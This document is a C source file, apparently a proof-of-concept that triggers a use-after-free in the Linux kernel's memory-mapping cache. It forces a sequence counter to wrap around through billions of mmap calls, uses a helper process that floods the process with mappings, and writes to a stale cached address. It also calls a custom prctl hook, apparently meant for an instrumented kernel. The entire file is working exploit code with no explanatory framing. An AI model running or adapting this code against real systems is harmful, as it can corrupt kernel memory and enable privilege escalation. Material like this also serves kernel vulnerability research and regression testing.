#define _GNU_SOURCE
#include <string.h>
#include <sys/eventfd.h>
#include <sys/signal.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>
#include <sched.h>
#include <unistd.h>

int vma_spam_control_fd = -1;
int thread_done_fd = -1;
int vma_spam_done_fd = -1;
void sem_inc(int fd) {
	uint64_t val = 1;
	if (write(fd, &val, 8) != 8) err(1, "sem_inc");
}
void sem_dec(int fd) {
	uint64_t val;
	if (read(fd, &val, 8) != 8) err(1, "sem_dec");
}

void vma_spam_child(void) {
	prctl(PR_SET_PDEATHSIG, SIGKILL);
	for (int i=0; i<2; i++) {
		sem_dec(vma_spam_control_fd);
		for (int i=0; i<1000; i++) {
			char *addr = mmap(NULL, 0x2000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
			if (addr == MAP_FAILED) err(1, "mmap spam");
			mprotect(addr, 0x1000, PROT_READ);
		}
	}
	sem_inc(vma_spam_done_fd);
}


unsigned char child_stack_area[0x8000];

int empty_child_fn(void *dummy) {
	syscall(__NR_exit, 0);
	/* unreachable */
	return 0;
}

#define UAF_ADDR ((char*)0x133700000000)

int child_fn(void *dummy) {
	prctl(0x13371337);

	void *p = mmap(NULL, 0x3000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
	if (p == MAP_FAILED) err(1, "mmap");
	p += 0x1000;

	for (unsigned long i=0UL; 1; i+=2) {
		unsigned long mm_seq = i; // even
		unsigned long task_seq = mm_seq - 2;
		if (mm_seq == 0xfffffffaUL) break;
		//if (mm_seq == 0xfffaUL) break;
		if ((i % 0x1000000) == 0) {
			/*
			char state[100];
			sprintf(state, "mm_seq(2) = 0x%lx\n", mm_seq);
			write(1, state, strlen(state));
			*/
			// mm_sequence == i - 1
			// task_sequence == mm_sequence - 2
			//printf("at 0x%lx\n", i);
			prctl(0x13371337);
		}
		p = mmap(p, 0x1000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE|MAP_FIXED, -1, 0);
		if (p == MAP_FAILED) err(1, "mmap");
	}
	sem_inc(vma_spam_control_fd);
	for (unsigned long i = 0; i < 4; i++) {
		munmap(UAF_ADDR + i*0x200000, 0x10000);
	}
	munmap(p-0x1000, 0x3000);
	sem_inc(vma_spam_control_fd);
	sem_dec(vma_spam_done_fd);

	prctl(0x13371337);
	sleep(1);
	sem_inc(thread_done_fd);

	syscall(__NR_exit, 0);
	/* unreachable */
	return 0;
}


int main(void) {
	cpu_set_t cset;
	CPU_ZERO(&cset);
	CPU_SET(0, &cset);
	if (sched_setaffinity(0, sizeof(cpu_set_t), &cset))
		err(1, "affinity");

	vma_spam_control_fd = eventfd(0, EFD_SEMAPHORE);
	thread_done_fd = eventfd(0, EFD_SEMAPHORE);
	vma_spam_done_fd = eventfd(0, EFD_SEMAPHORE);

	int spchild = fork();
	if (spchild == -1) err(1, "fork");
	if (spchild == 0) {
		vma_spam_child();
		exit(0);
	}

	#define LONELY_MAPPING_ADDR ((char*)0x133800600000UL)
	char *lonely_mapping = mmap(LONELY_MAPPING_ADDR, 0x1000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (lonely_mapping != LONELY_MAPPING_ADDR)
		err(1, "mmap lonely mapping");

	for (unsigned long i=0; i<4; i++) {
		void *addr = UAF_ADDR + i * 0x200000;
		if (mmap(addr, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0) != addr)
			err(1, "mmap UAF_ADDR");
		if (madvise(addr, 0x10000, MADV_RANDOM))
			err(1, "madvise");
	}

	prctl(0x13371337);
	void *p = mmap(NULL, 0x3000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
	if (p == MAP_FAILED) err(1, "mmap");
	p += 0x1000;
	for (unsigned long i=6UL; 1; i+=2) {
		unsigned long mm_seq = i - 1; // always odd!
		unsigned long task_seq = mm_seq - 2;
		if (mm_seq == 0xffffffffUL) break;
		//if (mm_seq == 0xffffUL) break;
		if ((i % 0x1000000) == 0) {
			// mm_sequence == i - 1
			// task_sequence == mm_sequence - 2
			//printf("at 0x%lx\n", i);
			/*
			char state[100];
			sprintf(state, "mm_seq(1) = 0x%lx\n", mm_seq);
			write(1, state, strlen(state));
			*/
			prctl(0x13371337);
		}
		p = mmap(p, 0x1000, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE|MAP_FIXED, -1, 0);
		if (p == MAP_FAILED) err(1, "mmap");
	}

	// dirty hack to fault in everything we need
	int child_tmp = clone(empty_child_fn, child_stack_area+sizeof(child_stack_area), CLONE_FILES|CLONE_FS|CLONE_IO|CLONE_SIGHAND|CLONE_SYSVSEM|CLONE_THREAD|CLONE_VM, NULL);
	sleep(3);
	sem_inc(thread_done_fd);
	sem_dec(thread_done_fd);

	// try to get UAF_ADDR cached
	for (unsigned long i=0; i<4; i++) {
		UAF_ADDR[i * 0x200000] = 1;
	}

	// one more, to wrap the mm_seq around to 0.
	// this should be a small mapping to avoid spamming the cache.
	munmap(lonely_mapping, 0x1000);
	prctl(0x13371337);
	int child = clone(child_fn, child_stack_area+sizeof(child_stack_area), CLONE_FILES|CLONE_FS|CLONE_IO|CLONE_SIGHAND|CLONE_SYSVSEM|CLONE_THREAD|CLONE_VM|SIGCHLD, NULL);
	if (child == -1)
		err(1, "clone");
	sem_dec(thread_done_fd); // wait for wraparound

	// #### fiddle with the multiplier in the range 0..3 so that it uses a cache slot
	// #### that won't get clobbered
	UAF_ADDR[0x4000 + 1 * 0x200000] = 1;

	prctl(0x13371337);
}
